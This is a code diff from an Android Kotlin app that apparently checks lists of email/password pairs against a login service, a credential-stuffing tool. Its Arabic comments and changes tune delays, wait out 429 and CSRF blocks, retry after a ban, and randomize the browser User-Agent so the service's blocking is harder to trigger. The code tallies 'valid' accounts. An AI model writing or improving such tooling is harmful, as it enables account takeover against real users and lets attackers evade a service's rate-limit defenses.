@@ -82,15 +82,20 @@ class MainActivity : AppCompatActivity() {
             for ((index, combo) in combos.withIndex()) {
                 val (email, pwd) = combo
                 
-                // تأخير 3 ثواني بين كل حساب لتجنب الحظر (429)
-                delay(3000) 
-                // استراحة 15 ثانية كل 10 حسابات
-                if (index > 0 && index % 10 == 0) {
-                    log.append("--- استراحة 15 ثانية لتجنب الحظر ---\n")
-                    delay(15000)
+                // تأخير ثابت بين كل حساب
+                delay(5000) 
+                
+                var (st, detail) = checkOne(email, pwd)
+                
+                // لو السيرفر حظرنا، نستنى دقيقة ونحاول تاني
+                if (st == "error" && (detail.contains("429") || detail.contains("no_csrf"))) {
+                    log.append("--- حظر مؤقت! استراحة دقيقة... ---\n")
+                    delay(60000)
+                    val retry = checkOne(email, pwd)
+                    st = retry.first
+                    detail = retry.second
                 }
-
-                val (st, detail) = checkOne(email, pwd)
+                
                 results.add(Triple(email, pwd, st))
                 when (st) {
                     "valid" -> valid++
@@ -113,8 +118,6 @@ class MainActivity : AppCompatActivity() {
         withContext(Dispatchers.IO) {
             try {
                 cookieStore.clear()
-
-                // نغير الـ User-Agent كل مرة عشان نصعب الحظر
                 val ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${(120..125).random()}.0.0.0 Safari/537.36"
 
                 val getReq = Request.Builder()
